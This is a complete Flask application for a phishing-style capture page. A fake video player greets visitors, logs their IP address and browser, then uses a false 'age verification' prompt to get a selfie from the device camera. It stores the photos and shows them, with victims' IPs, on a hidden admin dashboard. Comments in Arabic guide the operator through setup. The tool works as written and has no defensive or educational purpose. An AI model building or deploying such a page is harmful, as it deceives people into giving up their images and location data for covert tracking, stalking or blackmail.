# language: Python 3, file: app.py, runtime: Flask 3.x, target: Render
import json
import os
from datetime import datetime, timezone
from flask import Flask, request, redirect, render_template_string, abort

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "hits.json")
UPLOAD_FOLDER = os.path.join(BASE_DIR, "captured_images")

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# 1. الرابط اللي راح ينحول له الشخص بعد السحب (حط رابط الفيديو الحقيقي هنا)
REDIRECT_URL = "https://www.youtube.com" 

# 2. المفتاح السري حقك لدخول لوحة التحكم
ADMIN_KEY = "my_super_secret_key_2024"

def client_ip():
    if request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"

def load_data():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            try:
                return json.load(f)
            except:
                return []
    return []

def save_data(data):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

LANDING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .video-container { position: relative; width: 100%; max-width: 600px; aspect-ratio: 16/9; background: #111; border-radius: 8px; overflow: hidden; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
        .video-thumbnail { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 70px; background: rgba(255, 0, 0, 0.8); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.2s; }
        .play-button:hover { background: rgba(255, 0, 0, 1); transform: translate(-50%, -50%) scale(1.1); }
        .play-button::after { content: ''; display: block; width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 8px; }
        .modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); flex-direction: column; justify-content: center; align-items: center; z-index: 10; text-align: center; padding: 20px; box-sizing: border-box; }
        .modal h3 { margin: 0 0 10px; font-size: 18px; }
        .modal p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        .btn { padding: 10px 20px; background: #ff0000; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
        .loader { display: none; border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-top: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        input[type="file"] { display: none; }
    </style>
</head>
<body>
    <div class="video-container">
        <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000&auto=format&fit=crop" class="video-thumbnail" alt="Video">
        
        <div class="play-button" onclick="document.getElementById('verifyModal').style.display = 'flex'"></div>
        
        <div class="modal" id="verifyModal">
            <h3>Age Verification Required</h3>
            <p>Please verify you are over 18 by taking a quick photo.</p>
            <form id="uploadForm" action="/upload" method="POST" enctype="multipart/form-data">
                <input type="file" id="cameraInput" name="image" accept="image/*" capture="user">
                <button type="button" class="btn" onclick="document.getElementById('cameraInput').click()">Verify & Play</button>
                <div class="loader" id="loader"></div>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('cameraInput').addEventListener('change', function() {
            if (this.files.length > 0) {
                document.getElementById('loader').style.display = 'block';
                document.getElementById('uploadForm').submit();
            }
        });
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    ip = client_ip()
    data = load_data()
    record = {
        "id": str(len(data) + 1),
        "ts": datetime.now(timezone.utc).isoformat(),
        "ip": ip,
        "ua": request.headers.get("User-Agent", ""),
        "image": None
    }
    data.append(record)
    save_data(data)
    
    return render_template_string(LANDING_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    ip = client_ip()
    if 'image' not in request.files:
        return redirect(REDIRECT_URL)
    
    file = request.files['image']
    if file.filename == '':
        return redirect(REDIRECT_URL)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_ip = ip.replace(".", "_").replace(":", "_")
    filename = f"{safe_ip}_{timestamp}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)

    data = load_data()
    for record in reversed(data):
        if record["ip"] == ip and record["image"] is None:
            record["image"] = filename
            break
    save_data(data)

    return redirect(REDIRECT_URL)

@app.route("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        abort(404)
    data = load_data()
    data.reverse()
    
    admin_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font: 14px monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { border-bottom: 1px solid #30363d; padding: 12px; text-align: left; vertical-align: middle; }
            th { color: #58a6ff; }
            .ip { color: #ff7b72; font-weight: bold; }
            img { max-width: 100px; border-radius: 6px; border: 1px solid #30363d; }
        </style>
    </head>
    <body>
        <h3>Total Hits: {{ data|length }}</h3>
        <table>
            <tr><th>Time</th><th>IP</th><th>Device</th><th>Captured Image</th></tr>
            {% for r in data %}
            <tr>
                <td>{{ r.ts[:16].replace('T', ' ') }}</td>
                <td class="ip">{{ r.ip }}</td>
                <td>{{ r.ua[:30] }}...</td>
                <td>
                    {% if r.image %}
                        <a href="/admin/view/{{ r.image }}?key={{ request.args.get('key') }}" target="_blank">
                            <img src="/admin/view/{{ r.image }}?key={{ request.args.get('key') }}" alt="img">
                        </a>
                    {% else %}
                        -
                    {% endif %}
                </td>
            </tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """
    return render_template_string(admin_html, data=data)

@app.route("/admin/view/<filename>")
def view_image(filename):
    if request.args.get("key") != ADMIN_KEY:
        abort(404)
    if ".." in filename or "/" in filename:
        abort(400)
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if not os.path.exists(filepath):
        abort(404)
    with open(filepath, "rb") as f:
        img_data = f.read()
    return img_data, 200, {'Content-Type': 'image/jpeg'}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
